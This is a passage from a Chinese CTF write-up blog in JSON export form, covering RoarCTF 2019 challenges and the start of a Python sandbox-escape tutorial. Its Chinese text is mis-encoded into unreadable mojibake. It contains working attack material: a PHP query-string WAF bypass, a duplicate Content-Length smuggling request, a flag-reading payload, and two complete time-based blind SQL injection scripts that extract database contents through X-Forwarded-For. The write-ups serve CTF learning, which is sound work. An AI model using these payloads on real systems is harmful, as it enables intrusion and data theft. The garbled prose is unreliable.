</code></pre><p>æœ‰wafï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡ï¼š</p>\n<ol>\n<li>åˆ©ç”¨å­—ç¬¦ä¸²è§£æç‰¹æ€§ Bypass</li>\n</ol>\n<p>åŸç†çœ‹è¿™ç¯‡æ–‡ç« ï¼š<br><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p>è¿™é‡Œè¯´ä¸€ä¸‹å¤§æ¦‚æ„æ€<br> PHP å¤„ç† GET or POST è¯·æ±‚æ—¶å°†æŸ¥è¯¢å­—ç¬¦ä¸²è½¬æ¢æˆæ•°ç»„ <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> ã€‚å‚æ•°åé‡Œçš„ä¸€äº›å­—ç¬¦ä¼šè¢«ç§»é™¤æˆ–æ›¿æ¢æˆä¸‹åˆ’çº¿ <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> å¦‚æœWAFè§„åˆ™æ˜¯å‚æ•°é‡Œå«æœ‰ä¸€ä¸ªéæ•°å€¼å‹çš„å€¼æ—¶è¿›è¡Œæ‹¦æˆªæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸‹åˆ—è¯­å¥ç»•è¿‡<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> å®ƒä¼šè¢«å­˜å‚¨åœ¨ <code>$_GET[&quot;news_id&quot;]</code> ã€‚</p>\n<p>è¿™æ˜¯æµ‹è¯•phpæ˜¯å¦‚ä½•å¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼š</p>\n<pre><code>&lt;?php\nforeach(\n    [\n        &quot;{chr}foo_bar&quot;,\n        &quot;foo{chr}bar&quot;,\n        &quot;foo_bar{chr}&quot;\n    ] as $k =&gt; $arg) {\n    for($i=0;$i&lt;=255;$i++) {\n        echo &quot;\\033[999D\\033[K\\r&quot;;\n        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;\n        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);\n        /* yes... I&apos;ve added a sleep time on each loop just for\n        the scenic effect :)\nlike that movie with unrealistic\n        brute-force where the password are obtained\n        one byte at a time (âˆ©ï½€-Â´)âŠƒâ”â˜†ï¾Ÿ.*ï½¥ï½¡ï¾Ÿ\n        */\n        usleep(5000);\n        if(isset($o[&quot;foo_bar&quot;])) {\n            echo &quot;\\033[999D\\033[K\\r&quot;;\n            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\\n&quot;;\n        }\n    }\n    echo &quot;\\033[999D\\033[K\\r&quot;;\n    echo &quot;\\n&quot;;\n}</code></pre><p>è¿™é“é¢˜ç›®ç»è¿‡æµ‹è¯•å‚æ•°å‰åŠ ä¸€ä¸ª <code>%20</code>æˆ–è€… <code>+</code> æ¥ç»•è¿‡</p>\n<ol start=\"2\">\n<li>httpåè®®èµ°ç§æ”»å‡»</li>\n</ol>\n<blockquote>\n<p>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚</p>\n</blockquote>\n<p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡ CL-CL æ¥Bypass</p>\n<pre><code>POST /calc.php?num=phpinfo() HTTP/1.1\nHost: ********\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: keep-alive\nReferer: **********\nCookie: __cfduid=***********\nX-Forwarded-For: 127.0.0.1\nContent-Length: 7\nContent-Length: 7\nContent-Type: application/x-www-form-urlencoded\n\nnum=111</code></pre><p>ç»•è¿‡wafä¹‹åè¿˜ç¦æ‰äº†ä¸€äº›å­—ç¬¦ä¸èƒ½ç›´æ¥è¯»åˆ° flag ã€‚</p>\n<p>å…ˆå­¦ä¹ å‡ ä¸ªå‡½æ•°</p>\n<ul>\n<li>ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</li>\n<li>bin2hex â€” å‡½æ•°æŠŠåŒ…å«æ•°æ®çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼</li>\n<li>hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li>\n<li>dechex â€” åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</li>\n<li>base_convert â€” åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</li>\n<li>hexdec â€” åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶</li>\n</ul>\n<p>è¯»å–flag</p>\n<pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id=\"Online-Proxy\"><a href=\"#Online-Proxy\" class=\"headerlink\" title=\"Online Proxy\"></a>Online Proxy</h2><p>æ‰“å¼€é¶æœºï¼ŒæŠ“åŒ…å‘ç°å“åº”å¤´</p>\n<pre><code>&lt;!-- Debug Info: \n Duration: 0.058279037475586 s \n Current Ip: 127.0.0.1 </code></pre><p>åœ¨ XFF å¤„å°è¯•ä¿®æ”¹å†…å®¹ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹æˆåŠŸã€‚<code>Current Ip</code> å¤„æ˜¾ç¤ºå½“å‰çš„ XFFå€¼ï¼Œ<code>Last Ip</code> æ˜¾ç¤ºä¸Šæ¬¡æŸ¥è¯¢å†…å®¹ã€‚æ‰§è¡Œ sleep() è¯­å¥ <code>1&#39; and sleep(3) and 1=&#39;1</code> å‘ç°åœ¨ç¬¬äºŒæ¬¡è¿›è¡Œä¿®æ”¹å‘åŒ…ä¹‹åæˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p>\n<p>æ‰€è°“äºŒæ¬¡æ³¨å…¥å°±æ˜¯æœåŠ¡ç«¯åœ¨ç¬¬ä¸€æ¬¡æ¥æ”¶è„æ•°æ®æ—¶å¯¹æ•°æ®è¿›è¡Œäº† <code>addslashes</code> æˆ– <code>mysql_escape_string</code>  å¤„ç†ï¼Œä½†æ˜¯å­˜å…¥æ•°æ®åº“æ—¶å­˜çš„è¿˜æ˜¯è„æ•°æ®ï¼Œäºæ˜¯åœ¨ç¬¬äºŒæ¬¡æŸ¥è¯¢æ—¶ç”±äºæŸ¥è¯¢çš„æ˜¯è„æ•°æ®ï¼Œä¿¡æ¯ä»ç„¶ä¼šæ³„éœ²ã€‚</p>\n<p>æŸ¥çœ‹æºç ï¼š</p>\n<pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);\n$content = str_replace(&quot;&lt;a href=\\&quot;&quot;, &quot;&lt;a href=\\&quot;/?url=&quot;, $content);\n$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);\necho($content);\n$end = microtime(true);\n$time = $end - $start;\n$last_ip = &quot;&quot;;\n$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\nif(count($result) &gt; 0) {\n    if($ip !== $result[0][&apos;current_ip&apos;]) {\n        $last_ip = $result[0][&apos;current_ip&apos;];\n        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\n    } else {\n        $last_ip = $result[0][&apos;last_ip&apos;];\n    }\n}\nquery(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);\ndie(&quot;\\n&lt;!-- Debug Info: \\n Duration: $time s \\n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨æŸ¥è¯¢åˆ°æ•°æ®ä¹‹åï¼Œå¦‚æœ <code>$ip !== $result[0][&#39;current_ip&#39;]</code> é‚£ä¹ˆ <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ï¼Œéšåå°† last_ip ä¸å¸¦è¿‡æ»¤çš„å¸¦å…¥æ•°æ®åº“ä¸­æŸ¥è¯¢ã€‚</p>\n<p>æ‰€ä»¥æˆ‘ä»¬æ³¨å…¥çš„æ€è·¯å°±æ˜¯å…ˆå°† exp æ’å…¥æ•°æ®ï¼Œç„¶åå†æ­£å¸¸è®¿é—®ä¸€æ¬¡å°†æ•°æ®å¸¦å‡ºã€‚</p>\n<p>exp:</p>\n<pre><code>import requests\nfrom time import sleep\nurl = &quot;http://node3.buuoj.cn:28063/&quot;\ns = requests.session()\n\nre = s.get(url)\nname = &apos;&apos;\n&quot;&quot;&quot;\n# database name\n# current db : ctf\n# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# table name\n# ctf : ip_log\n# F4l9_D4t4B45e : F4l9_t4b1e\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# column_name\n# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMn\nfor i in range(1,20):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break</code></pre><p>è¿™ä¸ªå¤ªä¸ä¼˜é›…äº†ï¼Œèµµå¸ˆå‚…çš„æ›´ä¼˜é›…ï¼š</p>\n<pre><code>#!/usr/bin/env python3\n\nimport requests\n\ntarget = &quot;http://localhost:8302/&quot;\n\ndef execute_sql(sql):\n    print(&quot;[*]è¯·æ±‚è¯­å¥ï¼š&quot; + sql)\n    return_result = &quot;&quot;\n\n    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;\n    session = requests.session()\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    start_pos = r.text.find(&quot;Last Ip: &quot;)\n    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n    length = int(r.text[start_pos + 9: end_pos])\n    print(&quot;[+]é•¿åº¦ï¼š&quot; + str(length))\n\n    for i in range(1, length + 1, 5):\n        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;\n\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        start_pos = r.text.find(&quot;Last Ip: &quot;)\n        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n        result = int(r.text[start_pos + 9: end_pos])\n        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)\n\n        print(&quot;[+]ä½ç½® &quot; + str(i) + &quot; è¯·æ±‚äº”ä½æˆåŠŸ:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))\n\n    return return_result\n\n\n# è·å–æ•°æ®åº“\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))\n\n# è·å–æ•°æ®åº“è¡¨\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))\n\n# è·å–æ•°æ®åº“è¡¨\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))\n\n# è·å–è¡¨ä¸­å†…å®¹\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>è¿™é‡Œç”¨çš„æ˜¯ <code>1&#39;|&#39;1&#39;|&#39;1</code> ç„¶åå¼‚æˆ–ä¹Ÿå¯ä»¥ <code>1&#39;^&#39;0&#39;^&#39;1</code></p>\n<h2 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h2><blockquote>\n<p><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/213359.html</a></p>\n<p><a href=\"https://paper.seebug.org/1048/#32-cl-cl\" target=\"_blank\" rel=\"noopener\">https://paper.seebug.org/1048/#32-cl-cl</a></p>\n</blockquote>\n","text":"roarctf 201910/16/2019 4:45:49 PM easy_javaæ‹¿åˆ°é¢˜ç›®çœ‹åˆ°æ–‡ä»¶ä¸‹è½½çš„æ¥å£ï¼Œå°è¯• /Download?filename=help.docx ,å‘ç°æ²¡æ³•ä¸‹è½½ï¼Œå°è¯•ä¸‹è½½ç½‘é¡µä¸Šçš„ç…§ç‰‡å‘ç°ä¹Ÿä¸‹è½½ä¸äº†ï¼Œåæ¥å°±è·‘åäº†ï¼Œåœ¨æƒ³ä¼šä¸ä¼šæ˜¯ SSTI ?fuzzäº†","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"pythonæ²™ç›’é€ƒé€¸:ä»å¤´å¼€å§‹","slug":"pythonæ²™ç®±é€ƒé€¸","date":"2019-10-11T06:26:44.000Z","updated":"2019-10-14T12:20:33.712Z","comments":true,"path":"api/articles/pythonæ²™ç®±é€ƒé€¸.json","excerpt":"","keywords":null,"cover":"https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg","content":"<p>10/11/2019 2:26:44 PM </p>\n<h1 id=\"Python-æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ\"><a href=\"#Python-æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ\" class=\"headerlink\" title=\"Python æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ\"></a>Python æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ</h1><p>python æ²™ç®±é€ƒé€¸å°±æ˜¯åœ¨ä¸€ä¸ªè¢«ä¸¥æ ¼é™åˆ¶äº† python æ‰§è¡Œç¯å¢ƒä¸­è·å–æ›´é«˜çš„æƒé™ï¼Œç”šè‡³ getshell ,è¿™æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„ã€‚ä½†æ˜¯åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦ç»•è¿‡å„ç§é™åˆ¶ã€‚</p>\n<p>ç”±äºç¯å¢ƒä¸­é™åˆ¶äº†è®¸å¤šæ•æ„Ÿæ¨¡å—æ¯”å¦‚ os ã€ sys ï¼Œäºæ˜¯æˆ‘ä»¬çš„é‡ç‚¹å˜æˆäº†å¦‚ä½•ç»•è¿‡é™åˆ¶å»å¼•å…¥èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„æ“ä½œçš„æ¨¡å—ã€‚</p>\n<p>æ¥ä¸‹æ¥è®©æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ python çš„ä¸¤ä¸ªéå¸¸é‡è¦çš„ä¸œè¥¿</p>\n<h2 id=\"type-amp-object\"><a href=\"#type-amp-object\" class=\"headerlink\" title=\"type &amp; object\"></a>type &amp; object</h2><p>åœ¨ python é‡Œè¦æŸ¥çœ‹ä¸€ä¸ªç±»å‹çš„çˆ¶ç±»ï¼Œä½¿ç”¨å®ƒçš„ <strong>base</strong> å±æ€§æŸ¥çœ‹ã€‚  åœ¨ python é‡ŒæŸ¥çœ‹ä¸€ä¸ªå®ä¾‹çš„ç±»å‹ï¼Œä½¿ç”¨å®ƒçš„ <strong>class</strong> å±æ€§å¯ä»¥æŸ¥çœ‹ï¼Œæˆ–è€…ä½¿ç”¨ type() å‡½æ•°æŸ¥çœ‹ã€‚</p>\n<pre><code>&gt;&gt;&gt; object\n&lt;type &apos;object&apos;&gt;\n&gt;&gt;&gt; type\n&lt;type &apos;type&apos;&gt;</code></pre><p>ä»–ä»¬éƒ½æ˜¯ type çš„ä¸€ä¸ªå®ä¾‹ï¼Œè¡¨ç¤ºä»–ä»¬éƒ½æ˜¯ç±»å‹å¯¹è±¡ã€‚</p>\n<p>Python ä¸­ï¼Œ object æ˜¯çˆ¶å­å…³ç³»çš„é¡¶ç«¯ï¼Œæ‰€æœ‰æ•°æ®ç±»å‹çš„çˆ¶ç±»éƒ½æ˜¯å®ƒï¼› type æ˜¯ç±»å‹å®ä¾‹å…³ç³»çš„é¡¶ç«¯ï¼Œæ‰€æœ‰å¯¹è±¡éƒ½æ˜¯å®ƒçš„å®ä¾‹ï¼Œä»–ä»¬çš„å…³ç³»å¯ä»¥æè¿°ä¸º: object æ˜¯ä¸€ä¸ª type (object is a instance of type)ï¼Œå³ Object æ˜¯ type çš„ä¸€ä¸ªå®ä¾‹ã€‚</p>\n<pre><code>&gt;&gt;&gt; object.__class__\n&lt;type &apos;type&apos;&gt;\n\n&gt;&gt;&gt; object.__bases__  #ç«™åœ¨é£Ÿç‰©é“¾é¡¶ç«¯çš„ç”·äººï¼Œæ²¡æœ‰çˆ¶ç±»\n()\n\n&gt;&gt;&gt; type.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; type.__class__    #type çš„ç±»å‹æ˜¯è‡ªå·±\n&lt;type &apos;type&apos;&gt;</code></pre><p>æˆ‘ä»¬å†å°è¯•å¼•å…¥ä¸€äº›å†…ç½®æ•°æ®ç±»å‹æ¥çœ‹çœ‹ï¼š</p>\n<pre><code>&gt;&gt;&gt; list.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; type.__class__\n&lt;type &apos;type&apos;&gt;\n&gt;&gt;&gt; dict.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; dict.__class__\n&lt;type &apos;type&apos;&gt;</code></pre><p><strong>ä»–ä»¬çš„çˆ¶ç±»éƒ½æ˜¯ object , ç±»å‹éƒ½æ˜¯ type</strong>ï¼Œè¿™ç‚¹å¾ˆé‡è¦ï¼</p>\n<p>æˆ‘ä»¬æŠŠä»–ä»¬æ”¾åœ¨ä¸€ä¸ªè¡¨é‡Œçœ‹çœ‹ï¼š</p>\n<p><img src=\"https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg\" alt></p>\n<p>ç™½æ¿ä¸Šçš„è™šçº¿è¡¨ç¤ºæºæ˜¯ç›®æ ‡çš„å®ä¾‹ï¼Œå®çº¿è¡¨ç¤ºæºæ˜¯ç›®æ ‡çš„å­ç±»ã€‚å³ï¼Œå·¦è¾¹çš„æ˜¯å³è¾¹çš„ç±»å‹ï¼Œè€Œä¸Šé¢çš„æ˜¯ä¸‹é¢çš„çˆ¶äº²ã€‚</p>\n<h2 id=\"builtinã€builtinsã€builtins-æ˜¯ä»€ä¹ˆï¼Ÿ\"><a href=\"#builtinã€builtinsã€builtins-æ˜¯ä»€ä¹ˆï¼Ÿ\" class=\"headerlink\" title=\"builtinã€builtinsã€builtins æ˜¯ä»€ä¹ˆï¼Ÿ\"></a><strong>builtin</strong>ã€<strong>builtins</strong>ã€builtins æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>python ä¸­æœ‰ä¸€ä¸ªå†…å»ºæ¨¡å—ï¼Œè¯¥æ¨¡å—ä¸­æœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼›è€Œè¯¥æ¨¡å—åœ¨ Python å¯åŠ¨ä¹‹åã€ä¸”æ²¡æœ‰æ‰§è¡Œä»»ä½•ä»£ç ä¹‹å‰ï¼Œpython ä¼šé¦–å…ˆåŠ è½½è¯¥å†…å»ºå‡½æ•°åˆ°å†…å­˜ä¸­ã€‚å¦å¤–ï¼Œè¯¥å†…å»ºå‡½æ•°ä¸­çš„åŠŸèƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸éœ€è¦æ·»åŠ ä»»ä½•å†…å»ºæ¨¡å—å‰ç¼€ï¼Œå…¶åŸå› æ˜¯å¯¹å‡½æ•°ã€å˜é‡ã€ç±»ç­‰æ ‡è¯†ç¬¦çš„æŸ¥æ‰¾æ˜¯æŒ‰ç…§ LE(N)GB çš„è§„åˆ™</p>\n<pre><code>locals -&gt; enclosing function -&gt; globals -&gt; builtins</code></pre><p>åœ¨ Python2.x ç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½ä¸º <code>__builtin__</code> , è€Œåˆ°äº† Python3.x ç‰ˆæœ¬æ›´åä¸º <code>builtins</code> .</p>\n<p>å½“ä½¿ç”¨å†…å»ºæ¨¡å—ä¸­å‡½æ•°æˆ–å…¶å®ƒåŠŸèƒ½æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¸ç”¨æ·»åŠ å†…å»ºæ¨¡å—çš„åå­—;ä½†æ˜¯ï¼Œå¦‚æœæƒ³è¦å‘å†…å»ºæ¨¡å—ä¸­æ·»åŠ ä¸€äº›åŠŸèƒ½ï¼Œä»¥ä¾¿åœ¨ä»»ä½•å‡½æ•°ä¸­éƒ½èƒ½ç›´æ¥ä½¿ç”¨è€Œä¸ ç”¨å†è¿›è¡Œimportï¼Œè¿™æ—¶ï¼Œå°±è¦å¯¼å…¥å†…å»ºæ¨¡å—ï¼Œåœ¨å†…å»ºæ¨¡å—çš„å‘½åç©ºé—´(å³ <strong>dict</strong> å­—å…¸å±æ€§)ä¸­æ·»åŠ è¯¥åŠŸèƒ½ã€‚åœ¨å¯¼å…¥æ—¶ï¼Œå¦‚æœæ˜¯ Python2.X ç‰ˆæœ¬ï¼Œå°±è¦å¯¼å…¥ <code>__builtin__</code> æ¨¡å—;å¦‚æœæ˜¯ Python3.Xç‰ˆæœ¬ï¼Œå°±è¦å¯¼å…¥builtins æ¨¡å—ã€‚å¦‚ï¼šåœ¨ Python2.X ä¸­ï¼Œå‘å†…å»ºæ¨¡å—æ·»åŠ  ä¸€ä¸ªå‡½æ•°(è¯¥å‡½æ•°æ‰“å° â€œhello, worldâ€ )ï¼Œå¯ä»¥è¿™æ ·å†™</p>\n<pre><code>&gt;&gt;&gt; import __builtin__\n&gt;&gt;&gt; def print_hello():\n...     print &quot;hello world!&quot;\n...\n&gt;&gt;&gt; __builtin__.__dict__[&apos;hello&apos;]=print_hello\n&gt;&gt;&gt; print_hello()\nhello world!\n&gt;&gt;&gt; hello()\nhello world!</code></pre><p>æ­¤æ—¶ï¼Œ <code>print_hello</code> å’Œ <code>hello</code> ä¸¤ä¸ªå‡½æ•°åå‡ ä¹æ˜¯ä¸€æ ·ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œ<code>print_hello</code>åªèƒ½åœ¨è¯¥æ¨¡å—ä¸­ä½¿ç”¨ï¼Œè€Œ <code>hello</code> å¯ä»¥åœ¨æœ¬ç¨‹åºä¸­çš„å…¶å®ƒä»»ä½•ä¸€ä¸ªæ¨¡å—ä¸­ä½¿ç”¨ï¼Œå› ä¸º <code>hello</code> å·²ç»æ”¾åˆ°å†…å»ºæ¨¡å—ä¸­äº†ã€‚</p>\n<p>è¯´å®Œäº† <code>__builtin__</code> å’Œ <code>builtin</code> ,é‚£ <code>__builtins__</code> æ˜¯ä»€ä¹ˆï¼Ÿ</p>\n<p><code>__builtins__</code> å³æ˜¯å¼•ç”¨ï¼Œä¹Ÿæ˜¯åœ¨ä»£ç è¿è¡Œä¹‹å‰è¢«åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ä½†æ˜¯å®ƒä»¬è¿˜æœ‰ä¸€ç‚¹åŒºåˆ«ï¼š</p>\n<ol>\n<li>æ— è®ºä»»ä½•åœ°æ–¹è¦æƒ³ä½¿ç”¨å†…å»ºæ¨¡å—ï¼Œéƒ½å¿…é¡»åœ¨è¯¥ä½ç½®æ‰€å¤„çš„ä½œç”¨åŸŸä¸­å¯¼å…¥ <code>__builtin__</code> å†…å»ºæ¨¡å—;è€Œå¯¹äº <code>__builtins__</code> å´ä¸ç”¨å¯¼å…¥ï¼Œå®ƒåœ¨ä»»ä½•æ¨¡å—éƒ½ç›´æ¥å¯è§</li>\n<li>åœ¨ä¸»æ¨¡å— <code>__main__</code> ä¸­ <code>__builtins__</code> æ˜¯å¯¹å†…å»ºæ¨¡å— <code>__builtin__</code> æœ¬èº«çš„å¼•ç”¨ï¼Œå³ <code>__builtins__</code> å®Œå…¨ç­‰ä»·äº <code>__builtin__</code> 